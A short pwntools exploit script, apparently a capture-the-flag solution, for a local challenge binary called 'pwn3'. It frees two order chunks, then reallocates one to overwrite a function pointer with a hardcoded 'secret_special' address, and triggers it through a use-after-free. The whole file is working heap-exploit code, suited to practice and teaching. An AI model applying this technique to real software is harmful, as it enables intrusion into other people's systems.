#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./pwn3')


def place_order(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def cancel_order(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def view_order(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


gdb.attach(r)
secret_special = 0x0804959a  # 需要根据实际地址修改

place_order(32, "aaaa")
place_order(32, "ddaa")

cancel_order(0)
cancel_order(1)

place_order(8, p32(secret_special))

view_order(0)

r.interactive()
